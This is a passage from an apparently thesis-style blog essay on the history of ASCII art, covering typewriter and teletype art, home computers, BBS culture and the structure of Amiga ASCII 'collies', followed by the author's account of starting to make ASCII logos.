height="824"><figcaption>(Figure 4.) Pitman’s Typewriter Manual (1893)</figcaption></figure><p>However, text art made with a typewriter can be seen to have flourished mainly in the 50s–70s. Around the same time in the 1950s, concrete poetry was born in different parts of the world, where the typewriter was used as a tool to create visual poems with the typographic layout of words being crucial to the impression. In concrete poetry, seeing and reading play an equally significant role<sup><a href="#fn11" id="fnref11">[11]</a></sup>. Artists and poets who used this method were interested in how printed words can be interpreted through their presentation and design. They sought ways to create new meanings and conceptual levels for the text by visually composing it<sup><a href="#fn12" id="fnref12">[12]</a></sup>.</p><p>At the same time, written messages were transmitted over radio links using teletype machines. Using a sound reminiscent of Morse code, the machine could remotely control another similar teletype machine, with messages printed on paper through a printer. What was written on paper at one end was automatically written on paper at the other end. To standardize the character graphics for teletypes, the 5-bit Baudot code was developed, which can be considered a precursor to the ASCII character system. Text art created with teletype machines was exchanged among other radio amateurs, and these works are very reminiscent of future ASCII art <sup><a href="#fn13" id="fnref13">[13]</a></sup> (Figure 5).</p><figure><img alt="The last supper rendered with text" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/Nlo5l3x-sh-640.jpeg" width="640" height="479"><figcaption>(Figure 5.) Teletype art.</figcaption></figure><p>The development of different forms of text art does not seem to be linear but appears to have occurred independently following each paradigm shift in information technology. They are fascinating examples of how technology has been used as a tool to create works far from what the technology developers could have imagined they would create. The pioneers of text art seem to have been primarily those who were not primarily artistically oriented but were interested in technology and its limitations.</p><p>The first step in the emergence of computer-made text art, called ASCII art, occurred with the change in Western consumption paradigm brought about by the microcomputer revolution in the late 1970s. How did this paradigm shift occur, and what followed? What steps led to the birth of ASCII art? I will discuss these issues in the next chapter.</p><h2 id="23-the-age-of-ascii-art">2.3. THE AGE OF ASCII ART</h2><h3 id="231-a-history-of-home-computers">2.3.1. A HISTORY OF HOME COMPUTERS</h3><p>At its core, computers are intricate calculators, adept at computing mathematical functions swiftly and processing vast amounts of data. Until the late '70s, these calculations and data processing were performed on large mainframes – the first-generation computers situated in glass-walled computer rooms. These were primarily used as instruments of centralized power within hierarchical organizations to manage large and complex commercial-administrative systems. This gave birth to an industry where IBM played a dominant role. These mainframes were only accessible to entities with significant capital, such as the defense industry, large corporations, and universities. Their operation required expertise in both hardware and software<sup><a href="#fn14" id="fnref14">[14]</a></sup>.</p><p>By the late '70s, foundational computer components, transistors, and microprocessors, had been miniaturized enough to allow for the creation of reasonably sized second-generation microcomputers. In essence, microcomputers did not differ from mainframes except in size, price, availability, and complexity<sup><a href="#fn15" id="fnref15">[15]</a></sup>.</p><p>However, the technology revolution didn't stem merely from technological achievements, but from the evolution of factories that produced components. As these components were miniaturized, their production costs reduced, and manufacturing energy efficiency and volumes increased. This allowed for mass production of computers. Yet, by the mid-'70s, a typical microcomputer user needed skills like soldering components, constructing keyboards, interfacing devices, and programming both the system and applications. Computers transitioned from computer rooms to design offices and labs, inadvertently giving rise to the hacker culture. A new wave of enterprises emerged in the IT sector, leading innovations and developing consumer-friendly applications and devices<sup><a href="#fn16" id="fnref16">[16]</a></sup>.</p><p>By the late '70s, new companies emerged that sold pre-assembled computers. Apple was one of these, with its Apple II in 1977 being the first massively successful mass-produced microcomputer. In a May 1977 article for <em>Byte</em> magazine, Apple's Steve Wozniak wrote,</p><blockquote><p>“I think a personal computer should be small, reliable, convenient to use, and inexpensive”<sup><a href="#fn17" id="fnref17">[17]</a></sup>.</p></blockquote><p>No longer did computer users need to be IT experts or hobbyists, but could simply be the "ordinary consumer".</p><p>The third generation, or personal computers, in the 1980s, transitioned IT from the hands of engineers to a broader user base who began applying it for tasks like word processing and spreadsheet calculations. By the '80s, the market had been flooded by several small, medium, and large companies offering various solutions. By 1983, however, the market was predominantly dominated by systems from three computer manufacturers: Apple Computer's <em>Apple II</em>, Commodore International's <em>Commodore 64</em> (and later <em>Amiga</em>), and IBM's <em>PC</em>. Each catered to slightly different consumer bases based on price and technical features. Apple computers were mostly sold to users wanting a mix of games and utility programs, Commodore dominated the gaming market because of its affordability and superior graphics and sound capabilities, and IBM rapidly secured a monopoly in the corporate IT world.</p><p>In the 1980s competition, IBM established the dominant standard for personal computers (IBM PC-compatible computers), but lost its exclusive rights to manufacture machines following its standard. By the end of the '80s, 80% of all sold microcomputers were either IBM-made or at least used its system. However, by the early '90s, the mantle had shifted to the Intel-Microsoft duo, whose actions reshaped the entire industry. Intel was responsible for processors, and Microsoft took care of the operating system<sup><a href="#fn18" id="fnref18">[18]</a></sup>.</p><p>Still, Amigas were popular in the early '90s and became significant among computer enthusiasts. They were more prevalent in Europe than in America, which influenced the strong Amiga culture in Europe. For instance, according to a reader survey conducted by <em>MikroBitti</em> magazine, 49% of its Finnish readers owned an Amiga, while 27% owned a PC, at the turn of 1991–1992<sup><a href="#fn19" id="fnref19">[19]</a></sup>.</p><p>However, Amiga's share of the home computer market declined sharply in subsequent years as PCs overtook them in terms of price-to-quality ratio. Commodore couldn't counteract IBM PC's and its clones' rise with their Amiga. Though initially ahead in terms of value, by 1992, it became challenging to produce cost-competitive technology against the ballooning PC industry<sup><a href="#fn20" id="fnref20">[20]</a></sup>.</p><p>In May 1994, Commodore filed for voluntary bankruptcy. However, the unwavering loyalty of some Amiga users ensured that the Amiga hobby and scene continued, even if new devices were no longer sold. By the mid-'90s, PCs had become the standard home computer in Europe, with no serious challengers in sight.<sup><a href="#fn21" id="fnref21">[21]</a></sup> Gradually, computers became a household item in Western countries.</p><p>Brushes and parchment, the printing press, teletype, and typewriters each enriched text-based communication in their time. Similarly, the most crucial factor of the computer revolution was the democratization of information as the computer became a consumer product<sup><a href="#fn22" id="fnref22">[22]</a></sup>. In the following subsections, I will discuss the evolution of computer writing systems and the emergence of different forms of ASCII art with these devices and systems.</p><h3 id="232-what-is-ascii-art">2.3.2. WHAT IS ASCII ART?</h3><p>In the 1960s, to facilitate the transfer of text-form information across various systems and devices, the ASCII character set standard was developed (an acronym for <em>American Standard Code for Information Interchange</em>)<sup><a href="#fn23" id="fnref23">[23]</a></sup>. In information technology, a character set is an agreement defining how binary numbers represented as bit combinations should be interpreted as characters belonging to a writing system. A computer can correctly process only those characters included in its known character set. ASCII is a 7-bit character set, covering 128 (2⁷) character positions, and primarily encompasses the letters, numbers, punctuation, and special characters, as well as certain control codes, required for American English<sup><a href="#fn24" id="fnref24">[24]</a></sup>.</p><figure><img alt="A list of characters in ASCII" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/06J-fhZapl-1092.png" width="1092" height="270"><figcaption>(Figure 6.) Printable letters and symbols from the ASCII character set.</figcaption></figure><p>Since computers typically use 8-bit bytes and ASCII is 7-bit, many computer manufacturers developed broader character sets where the spare bit was utilized. This doubled the number of characters from 128 to 256 (2⁸). In these character sets, the first 128 characters typically matched ASCII, but the remaining positions could be devoted, for example, to letters of other languages or characters reserved for table graphics. As a result, the extended character sets of different computer manufacturers could vary considerably<sup><a href="#fn25" id="fnref25">[25]</a></sup>.</p><p>ASCII remained the most commonly used character set on the Internet until 2007 when it was overtaken by the UTF-8, based on the Unicode standard, comprising over 110,000 characters<sup><a href="#fn26" id="fnref26">[26]</a></sup>.</p><p>Artwork created with the ASCII character set is referred to as ASCII art. However, the term "ASCII art" has become an umbrella term for all types of images formed from computer-assisted characters. This is somewhat misleading, as ASCII refers to the original 7-bit, 128-character position character set. Most ASCII art, however, is crafted using extended 8-bit or higher character sets. The most renowned forms of ASCII art are 7-bit ASCII art, ANSI art, Amiga ASCII, ATASCII, PETSCII, Shift_JIS, teletext, and Unicode art. Each employs a distinct character set and often a specific font to craft the images<sup><a href="#fn27" id="fnref27">[27]</a></sup>.</p><p>Most ASCII art is crafted using a computer's text-based system (known as "textmode"), which consists of a grid built from identically sized cells. Each cell can contain one character. Characters employ a monospaced font, with each character occupying equal space, thus each row can contain an equal number of characters. The number of characters per row depends on the system and application in use. For instance, IBM PCs employed an 80x25 grid for displaying text, with a maximum of 25 rows, each having 80 cells. Current text processing predominantly supports variable-width fonts, which weren't viable in textmode. ASCII art made in textmode can thus be described as a kind of mosaic, where typographical symbols are precisely arranged on a grid to form an image<sup><a href="#fn28" id="fnref28">[28]</a></sup>.</p><p>One of the earliest images reminiscent of ASCII art was created by Kenneth Knowlton and Leon Harmon, both of whom worked at Bell Labs. The image was a mosaic of a nude, comprised of symbols used in electronic circuit diagrams<sup><a href="#fn29" id="fnref29">[29]</a></sup>: (Figure 7).</p><figure><img alt="A black and white image of reclaining nude body, comprised of symbols used in electronic circuit diagrams" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/hgult1_0qR-2000.jpeg" width="2000" height="853"><figcaption>(Figure 7.) Harmon-Knowlton nude.</figcaption></figure><blockquote><p>"The nonscientific, some say artistic, aspects of computer graphics arose for me via a sophomoric prank. Ed David, two levels up, was away for while and the mice, one might say, played ever more freely. Leon Harmon stopped by to ask me for help with a brilliant idea: when Ed returns, one entire wall of his office will be covered with a huge picture made of small electronic symbols for transistors, resistors and such. But overall, they will form a somewhat-hard-to-see picture of, guess what, a nude! And so the renowned Harmon-Knowlton nude was conceived, coaxed into being, and duly hung on Ed's wall."<sup><a href="#fn30" id="fnref30">[30]</a></sup>.</p></blockquote><p>Even though this image was swiftly removed from the office wall and rapidly dismissed by Bell Labs' PR department, it leaked to the public, ending up on the pages of The New York Times and even on display at the Museum of Modern Art in New York in an exhibition titled <em>The Machine as Seen at the End of the Mechanical Age</em>. This prank turned into a sensation in a short time, and the creation of this symbol-based mosaic was a crucial step in the evolution of computer graphics and ASCII art<sup><a href="#fn31" id="fnref31">[31]</a></sup>.</p><h3 id="233-what-is-amiga-ascii-art">2.3.3. WHAT IS AMIGA ASCII ART?</h3><p>ASCII art made with the Amiga computer's font and column settings is called Amiga ASCII.</p><p>The Amiga has its own 8-bit character set. The first 128 characters follow the ASCII standard, but the remaining 128 characters belong to Amiga's extended character set. It isn't particularly suited for drawing pictures and graphics, as it doesn't contain characters meant for drawing tables and graphics, unlike character sets of some other contemporary machines. Amiga's extended character set mainly contains some mathematical symbols and some characters of European languages, such as the letters ä, ö, and å used in Finnish.</p><figure><img alt="A list of characters in Amiga" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/WClLk5xu82-583.png" width="583" height="309"><figcaption>(Figure 6.) Printable letters and symbols from the Amiga character set.</figcaption></figure><p>What makes the Amiga particularly suitable for creating text art, however, is its default monospaced font "Topaz". Its letterforms and column settings allow for the creation of cohesive patterns. In Amiga, the line spacing and character spacing are very narrow, so certain characters "merge" if arranged correctly. For example, by typing an underscore followed immediately by a slash, it looks as if these two characters were one cohesive pattern and not two separate characters.</p><p>By combining these characters, it's possible to create pictures resembling sketches or outline drawings. This is a special feature of Amiga ASCII, distinguishing it from all other forms of ASCII art. Amiga ASCII is also called line-ASCII to differentiate it from filled-ASCII made on PCs.</p><p>Slashes and underscores are perhaps the most commonly used characters in Amiga ASCII art. These characters form the basis of many Amiga ASCII pictures. Two slashes placed one below the other form a cohesive slanting line, and two underscores in a row form a straight horizontal line. These characters can form an endless variety of shapes, which almost seamlessly connect to each other. Due to the cohesive line formed by the slash, many Amiga ASCII logos look italic or slanted.<sup><a href="#fn32" id="fnref32">[32]</a></sup></p><figure><img alt="The word foundation rendered in Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/O8X5M6sFju-397.png" width="397" height="115"><figcaption>(Figure 9.) Foundation - this word is formed using the Topaz font characters / \ and _ with Amiga's original column settings.</figcaption></figure><p>Michael Hischer, whom I interviewed, describes his technique as:</p><blockquote><p>"[The limited number of characters] has always been an opportunity and challenge for me to create something that others don't do or can't do. I never use more than ten characters when creating ASCII. An excessive number of characters would be a distraction and divert from the essentials." <sup><a href="#fn33" id="fnref33">[33]</a></sup> (Figure 10)</p></blockquote><figure><img alt="Various typographical symbols from the Amiga character set" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/-84UvNu9jk-485.png" width="485" height="34"><figcaption>(Figure 10.) Characters mainly used in the art of Michael "Skin" Hischer, a pioneer of Amiga ASCII art.</figcaption></figure><p>Amiga ASCII is part of a broader phenomenon called the demoscene. The demoscene is a computer hobbyist subculture centered around its cultural artifacts, demos. Demos are real-time audiovisual presentations executed on a computer, made especially within the demo culture, or demoscene, that emerged around the mid-1980s.<sup><a href="#fn34" id="fnref34">[34]</a></sup> The Amiga scene, on the other hand, is a subculture of the demoscene, centered on logos and other visual materials made for BBS usage and the competitive skill of text artists.<sup><a href="#fn35" id="fnref35">[35]</a></sup></p><p>Amiga ASCII art can be seen as a continuation of PETSCII art made on Commodore's earlier Commodore 64 computer. PETSCII refers to the character set of the Commodore 64, which was well-suited for text art. The technologically advanced Amiga, however, replaced the Commodore 64, and many PETSCII artists began to create text art on Amiga computers. However, the popularity of Amiga ASCII art is mainly based on the culture and social communities formed around BBS<sup><a href="#fn36" id="fnref36">[36]</a></sup>. For this reason, I will mainly focus on discussing Amiga ASCII during the BBS era, leaving out the similarities of PETSCII art to Amiga ASCII.</p><p>Nowdays Amiga ASCII is mostly created on PC, Mac or Linux computers. The only defining factor for Amiga ASCII art today seems to be the method of creating the image using the Amiga font.</p><h3 id="234-the-golden-age-of-amiga-ascii">2.3.4. THE GOLDEN AGE OF AMIGA ASCII</h3><p>A BBS (<em>Bulletin Board System</em>) refers to a computer connected to the landline network through a modem, to which its users, or BBS enthusiasts, connected with their own computer. The main focus of BBSs was primarily on various discussion areas and file sharing. Many BBSs formed tight-knit user communities and served as meeting places for various groups. BBSs can be thought of as precursors to many features familiar from today's Internet, such as social communities.<sup><a href="#fn37" id="fnref37">[37]</a></sup></p><p>The origin of BBSs began when Ward Christensen and Randy Suess (US) developed the MODEM program in 1978 mainly for data exchange within their computer club. With it, two computers could communicate and exchange files. Later that year, Christensen and Suess developed the system known as the world's first BBS called CBBS (<em>Computer Bulletin Board System</em>)<sup><a href="#fn38" id="fnref38">[38]</a></sup>.</p><figure><img alt="Amiga computer connected to a CRT showing a colorful BBS menu screen" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/-NVaxnysH8-640.jpeg" width="640" height="480"><figcaption>(Figure 11.) BBS rig on an Amiga 1200 computer.</figcaption></figure><p>Connections to the BBS were made using a modem connected to the landline network, using a character-based terminal program. Connecting cost the same as making a regular phone call. International connections were thus possible, though expensive. After calling the BBS, the user had to log into the system first. Most often, real names and sometimes also pseudonyms or handles were used in BBSs. In addition, during registration, users were often asked for name and address information and sometimes also for certain data communication settings.<sup><a href="#fn39" id="fnref39">[39]</a></sup></p><p>BBSs were navigated using keyboard commands in various menus. There were several different menu levels, usually varying according to the software the BBS used. Typically, BBSs included discussion areas, file areas, private messages, bulletins, and in some systems, it was also possible to play text-based games or chat in real-time with other users and the BBS administrator. File exchange was a significant part of BBSs, as uploading files earned usage time in the BBS.<sup><a href="#fn40" id="fnref40">[40]</a></sup></p><p>BBS activities remained for a long time within a small group interested in data communication and microcomputers. Gradually, as modem speeds increased towards the end of the 1980s, it began to spread to the awareness of larger user groups. What started primarily to facilitate mutual information exchange began to form a subculture. The age and user structure began to change, and at the same time, the ways BBSs were used diversified significantly. In the 90s, the subculture was mainly composed of young men aged 15-20. They shared an interest in computers and the possibilities they created<sup><a href="#fn41" id="fnref41">[41]</a></sup>. BBSs were significant communal forums for social activity. They served as meeting places for friend groups as well as hobbyist and subcultural groups<sup><a href="#fn42" id="fnref42">[42]</a></sup>.</p><p>Due to the home computers on the market that were incompatible with each other, hobbyists were loosely divided into different user groups specific to each computer. It was possible to log into BBSs with any computer, but due to the different character set standards, they might not necessarily display or function correctly. As a result, Amiga and MS-DOS-based PCs developed slightly different user cultures, even if their basic vibe was the same<sup><a href="#fn43" id="fnref43">[43]</a></sup>.</p><h3 id="235-ascii-art-to-decorate-bbs-boards">2.3.5. ASCII ART TO DECORATE BBS BOARDS</h3><p>Data transfer via modem was very slow and therefore consisted mainly of text files. Terminal programs used to connect to the BBSs also operated under text-based operating systems. Due to their text-based nature, the BBS user interfaces were quite austere. There arose a need to embellish these interfaces and create images.</p><p>Amiga and PC-based BBSs started to be decorated with ASCII graphics. Most of the BBSs operated on PCs, which were not compatible with Amiga (Figure 12). Graphics on the PC were created using the extended character set and font of the original IBM PC, known as ANSI art.</p><figure><img alt="The word GRMMXI in PC and Amiga ASCII styles. The PC style word looks like it's outline is made of dashed lines while the Amiga has a more seamless outline." loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/qzXH73V-55-749.png" width="749" height="144"><figcaption>(Figure 12.) The same logo in IBM PC's (left) and Amiga's (right) fonts.</figcaption></figure><p>ANSI art is a form of ASCII art. However, it significantly differs from other forms of ASCII art, as ANSI art mainly consists of rectangular raster bars and looks more like pixel graphics than actual text art. PC computers' ROM (<em>read only memory</em>) contained the character set and font specified on <em>"code page 437"</em>. This character set includes the 128 characters of the ASCII standard and additionally a set of graphical elements specifically for drawing tables and graphics. However, ANSI images are primarily composed of five characters, whose different strength raster surfaces enable the creation of color fields and shading on an 80x25 grid. Using color was also possible through terminal control codes included in the terminal control standard. The typical ANSI color palette consists of 16 colors and 8 background colors, which was later expanded to 16 colors and 8 background colors. This allowed for significantly more imposing images than traditional ASCII graphics.<sup><a href="#fn44" id="fnref44">[44]</a></sup></p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Because the tools for creating ANSI and Amiga ASCII are mostly the same, many contemporary Amiga ASCII pieces also use ANSI colours. However, if colored Amiga ASCII is viewed on an actual Amiga, the colours wouldn't show.</p></div><p>ANSI graphics were originally used in <em>crack intros</em><sup><a href="#fn45" id="fnref45">[45]</a></sup> for illegal software copies and in the logos of BBS login pages. Before long, ANSI artists formed groups and began publishing monthly packages containing ANSI art. Activities were typically organized, and intergroup competition became an essential factor in maintaining the intensity of the hobby.</p><p>A few comprehensive studies and other literature have been written on ANSI art and its related culture, so I will omit its in-depth discussion from this thesis.</p><p>Amiga ASCII was largely created for applications related to BBS boards. BBS administrators needed beautiful login pages and ASCII art to embellish various sections of the BBS to improve the user interface.</p><p>In the early 1990s, Amiga ASCII art groups and individuals began to release their materials as <em>collies</em> or logo collections. This convention can be seen as having come from the ANSI art side, where groups published their works in art packs. However, Amiga ASCII collies were individual text files containing all the material, while ANSI art packs were collections of separate files.</p><p>Today, BBS boards have no practical significance and exist mostly for nostalgic purposes. They can also be a status symbol for groups and a way to pass the time. However, various websites on the Internet have replaced the BBSs as the publication channel for collies<sup><a href="#fn46" id="fnref46">[46]</a></sup>.</p><h3 id="236-what-is-a-colly">2.3.6. WHAT IS A COLLY?</h3><p>Colly, or collection, is a text file containing a collection of Amiga ASCII artworks created by one or more artists. The primary purpose of collies is to showcase the latest works of an ASCII artist in one place.</p><p>The term "colly" originated from the Amiga ASCII group <em>ART</em>'s 1992 released logo collection called <em>Collection volume 1</em> <sup><a href="#fn47" id="fnref47">[47]</a></sup>, after which it became a common practice within the subculture. Collies were the primary publishing format for Amiga ASCII art and have remained so to this day.</p><p>Rarely was Amiga ASCII used for traditional, representational art. However, representational images might be used in collies as illustrations. The main content of collies was typographic logos. They were usually made to a maximum size of 80x25, as the terminal programs used to connect to BBS were this size. Logos were typically 7-12 letters long, depending on the width of the logo font. The letters of a logo were often adjusted according to the length of the word and its intended use. The same logo style could be applied to words of different lengths. Even four-letter logos could be stretched to 80 cells to suit its use in BBS. Often, ornaments or texturing were made around the logo to frame the logo itself<sup><a href="#fn48" id="fnref48">[48]</a></sup>.</p><p>Some collies were collections of miscellaneous logos, advertisements, and other materials used in BBS made by the artist. However, many collies showcased the artist's newly developed typographic style to make logos. Collies could also be made in collaboration with another artist. Then both artists would create their own version of a particular word, and the person who commissioned the word could choose which one to use<sup><a href="#fn49" id="fnref49">[49]</a></sup>. Collies were often thousands of lines long.</p><p>Artists releasing collies competed with other artists for the best colly. An individual or group that made a beautiful colly gained respect and status among members of the subculture. Makers of high-quality ASCII art could also ascend within the group's internal hierarchy or receive invitations to generally more esteemed groups. As in other computer enthusiast subcultures, competition among groups and their members was a key factor in motivating groups to publish and maintain the quality of collections.</p><p>A colly traditionally consists of the following elements:</p><p>A. Advertisement for the group's own BBS<br>B. Title of the colly, creator's logo, and group logo<br>C. Table of contents (<em>index</em>)<br>D. Introduction / creator comments<br>E.

Advertisement for the group's own BBS</strong></h4><p>Collies usually begin with either an advertisement for their own BBS or a title. The BBS advertisement promotes the group's own headquarters (<em>HQ</em>) BBS. The headquarters serve as the group's primary publication channel for new collies, the place where the group's productions arrive the fastest<sup><a href="#fn50" id="fnref50">[50]</a></sup>.</p><figure><img alt="Logo and various advertising text in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/7uulPp4D8q-640.png" width="640" height="338"><figcaption>(Figure 13.) BBS can advertisement from the colly "zeitgeist|moving|on" by the Finnish Amiga ASCII artist operating under the pseudonym Zeus.</figcaption></figure><p>In the ad, the name of the BBS is made as an ASCII image, and details about the BBS are listed around it. This information usually includes which groups it serves as the headquarters for, the names of the BBS administrators, technical details, software, and addresses used for connection. Only those with a functional BBS use a BBS advertisement. (Figure 13).</p><p>BBS advertisements were also made for BBSs other than the group's own. These ads could be spread on discussion areas reserved for ads in other BBSs. The more impressive the ad and the more famous the artist who made it, the more people it attracted to visit the advertised BBS<sup><a href="#fn51" id="fnref51">[51]</a></sup>.</p><h4 id="b-title-of-the-colly-creators-logo-and-group-logo"><strong>B. Title of the colly, creator's logo, and group logo</strong></h4><p>At the beginning of collies, there is usually a title. The title may include the name of the colly creator, the name of the group the creator belongs to, and the name of the collection. The title is important because it reflects the theme and style of the collection and gives a taste of what's to come. It serves as an introduction to the following sections. (Figure 15).</p><figure><img alt="Various logos, text and patterns in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/q0sKBwdl_E-640.png" width="640" height="1474"><figcaption>(Figure 15.)

Table of contents (index)</strong></h4><p>The table of contents lists the ASCII images contained in the collection in numerical order. In the list, names are usually written in plain text. Tables of contents are used especially in long collies, which may contain hundreds of logos and other ASCII images made for various parties.</p><p>Collies often also contain a brief introduction, where the creator writes about the origin or theme of the collection, their own life, news, or other matters related to the subculture. This allows the creator to explain the background of their colly, express their thoughts related to drawing, or reinforce their position as an Amiga ASCII creator. (Figure 14).</p><figure><img alt="Logo and epilogue text in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/eesZDISCjl-640.png" width="640" height="514"><figcaption>(Figure 14.)

The actual content of the collection, i.e., ASCII logos, BBS advertisements, and FILE_ID.DIZ files</strong></h4><p>The main content of collies consists of ASCII logos made for others, BBS advertisements, and file_id.diz text files. These usually come as requests from other members of the subculture. For example, a BBS administrator might ask an Amiga ASCII artist to create a login page logo for their BBS. Then the creator of the colly can use their newly developed style to create a logo for the BBS administrator to use. So, ASCII logos were often put to some use. ASCII logos could be requested by anyone, individuals, or groups.</p><p>FILE_ID.DIZ is an ASCII text file that contains a short description of the content of the archive file. Many BBSs allowed users to upload their own files for others to download. BBS administrators might require the person uploading a file to also provide a description of the content they are uploading. To standardize descriptions, archive files were supplemented with a FILE_ID.DIZ file to provide a clear description of the content to be downloaded. The text file was required to contain at least the program name, version number, and a description of the file to be downloaded. Traditionally, FILE_ID.DIZ was allowed to be 10 lines long, with each line containing a maximum of 45 characters<sup><a href="#fn52" id="fnref52">[52]</a></sup>.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/3C-ZTpt4aK-640.png" width="640" height="306"><figcaption>(Figure 16.) FILE_ID.DIZ file for nuancE from the colly "zeitgeist|moving|on". The top bar serves as a separator and provides the logo number, plain-language name, and purpose (FILE_ID.DIZ), as well as the collection name. The numbers and spacing symbols around the logo are not part of the logo itself but indicate row and character count. In this FILE_ID.DIZ logo, the requester's name is stylized. Placeholder text is left below it for layout testing when there is no actual content yet. The bottom corner contains the artist's pseudonym abbreviation zS! i.e., Zeus.</figcaption></figure><p>However, Amiga ASCII artists began to use this file for their own needs, often as an icon for the colly. In this case, FILE_ID.DIZ contains the name of the colly, the creator, and some release information. The purpose of the icon is to be as impressive as possible to attract the attention of others, as it serves as a preview for the actual colly.</p><p>Different logos are separated by a separator. The separator also structures the content and helps with navigation. The separator usually lists the logo number, which matches the table of contents, the name of the colly, the name of the logo, and/or the name of the person requesting the logo. Because logos are often difficult to read, the text of the logo in the separator is often written in plain text.</p><p>Amiga ASCII logos always have the artist's own abbreviation attached, indicating the creator and copyright. The worst violation is to steal someone else's style or logo and claim it as one's own. If caught, the punishment could be exclusion from the subculture<sup><a href="#fn53" id="fnref53">[53]</a></sup>.</p><h4 id="f-credits"><strong>F. Credits</strong></h4><p>Credits provide the closing details for the colly. It lists the creator's name (or names) and possible guest appearances, i.e., if another Amiga ASCII artist participated in the creation of the colly. The credits often state the release date, file size, file name, font used, text editor or other technical details. Often the credits also mention what music the creator listened to while creating the colly.</p><h4 id="g-greetings"><strong>G. Greetings</strong></h4><p>Greetings, or <em>greets</em>, list the creator's personal acquaintances.</p><h4 id="h-acknowledgments-respects"><strong>H. Acknowledgments (respects)</strong></h4><p>In acknowledgments, or <em>respects</em>, Amiga ASCII artists who are admired and respected by the creator are listed, even if they are not personally known.</p><p>Greetings and acknowledgments were once important for increasing visibility. In listings called ASCII charts, Amiga ASCII artists were ranked by popularity using various metrics. Amiga ASCII artists could be publicly voted on, or the greetings and acknowledgments included in collies were counted together, measuring the artist's popularity. Those who received the most greetings and acknowledgments from other artists topped the list, in turn increasing their popularity and visibility of their collies. Rankings also took into account for whom other artists had made logos. This partly motivated designing logos for other ASCII artists<sup><a href="#fn54" id="fnref54">[54]</a></sup>.</p><p>The largest archive site for Amiga ASCII collies, <em><a href="http://asciiarena.com/">asciiarena.com</a></em><sup><a href="#fn55" id="fnref55">[55]</a></sup>, lists about 4,000 collies from 780 different artists spanning the years 1992-2015. Most of them were released before the year 2000. While Amiga ASCII might be considered a niche subculture, the number of artworks and artists indicates a significant phenomenon.</p><div><h4 id="note-from-2023">Note from 2023:</h4><p>Asciiarena.com is nowdays <a href="https://asciiarena.se/">asciiarena.se</a>, but unfortunately it seems to be down every once in a while.

MY STARTING POINT FOR CREATING ASCII ART</h2><p>I didn't get to witness the golden days of BBSs and ASCII art or belong to the ASCII art-related subculture because the subculture had already waned by the time I started my computer hobbies in the early 2000s. However, I remember what the Internet was like in the late 90s and early 2000s. It was a magical and mysterious place for me, where every now and then, I'd encounter these strange images made up of mere characters. These could be seen in text-based info files of downloaded files, comments on discussion boards, or hidden in a website's source code. These images intrigued me, and at about ten years old, I too wanted to master this art of image-making: slowly, one letter at a time, I typed an image of a DJ playing records. The technique was challenging and time-consuming enough that I tried it only once.</p><p>In January 2014, I found a web-based hobby magazine on the internet, <em>OrDeR Of ThE ShAdOw Wolf</em>, a cyberzine, made by the Dutch electronic music-producing artist Danny "Legowelt" Wolfers. For a moment, the internet felt magical and mysterious again, as I read text laid out in green monospaced font on a black background, with titles and images made in ASCII.</p><p>Legowelt starts the cyberzine with these words:</p><blockquote><p>"Welcome to the first issue of ORDER OF THE SHADOW WOLF, a cyberpunk e-zine in true original text format. This is how e-zines looked before the dawn of the internet in the 1980s and early 1990s. They were distributed via BBS's [...]. People would download these e-zines on their 300 baud modems and read them on their monochrome green screens late at night. Difficult to imagine now but doing this felt like the most exciting thing in the world, surrounded by a mystique of hacker romanticism and being a cyberpunk pioneer. It was a time when your mum and retarded jock cousin weren't on the internet, even more hardcore...you were probably the only person in your whole town or area logged into cyberspace!" <sup><a href="#fn56" id="fnref56">[56]</a></sup></p></blockquote><p>I wanted to delve into this obscure subculture and the way of making images. It felt fascinating. I also don't believe I'm very skilled in illustrating, designing logos, or producing visual material in general. I wanted to enhance my creative expression. After trying to draw my first ASCII image, I found that making logos and images with the constraints set by ASCII is quite liberating. The limitation of the ASCII character set forces creativity and uses it as a strength for making images. The primitive nature of this medium felt like the right method to develop my expression.</p><p>I set the following goals for myself before embarking on the project:</p><blockquote><p>"I intend to try various styles and techniques to draw logos with ASCII. Initially, at least, I will use the word "GRMMXI" as the text for my logos, which represents my friends/classmates/artistic community for whom, and to whom, I'm creating these logos. This will keep me motivated. Through experimentation, I aim to observe shapes, typography, logos, and textures in a new light, thereby evolving as a graphic designer. I also haven't done much logo design before, so I hope this approach brings new perspectives to logo design."</p></blockquote><h3 id="311-finding-the-right-method">3.1.1. FINDING THE RIGHT METHOD</h3><p>I work as a web designer, so I started working on my first experiments with the text editing tool I know best: a code editor. However, I soon realized that with the default font of the code editor, I couldn't produce results that met my expectations: the characters didn't mesh well together. I wanted to know how ASCII art is really made.</p><figure><img alt="Logo in black and white Amiga ASCII style" loading="lazy" decoding="async" src="https://blog.glyphdrawing.club/assets/XvtWRhhzHJ-380.png" width="380" height="223"><figcaption>(Figure 17.) FILE_ID.DIZ file from the collective publication of the Break group.</figcaption></figure><p>While getting acquainted with ASCII art, I wasn't yet aware of the existence of Amiga ASCII. From the site <em><a href="http://sixteen-colors.net/">sixteen-colors.net</a></em><sup><a href="#fn57" id="fnref57">[57]</a></sup>, which archives ASCII and ANSI art, I found the logo of the <em>Break</em> group (Figure 17). I had never seen ASCII graphics of this style before, where the lines connect almost seamlessly. I wanted to make my thesis using this technique and began to delve into the technical characteristics of this style.</p><p>In my search, I found the website <em><a href="http://asciiarena.com/">asciiarena.com</a></em>, which archives Amiga ASCII collies. It is the most comprehensive site archiving Amiga ASCII and now serves as the primary publishing channel for new Amiga ASCII works for many. The site is full of increasingly impressive Amiga ASCII collies, and browsing through the works of others served as a significant source of inspiration throughout the project. I decided that I wanted to publish my project on this site in its original colly format.</p><p>I found and installed the original Amiga fonts<sup><a href="#fn58" id="fnref58">[58]</a></sup> in TTF format on my 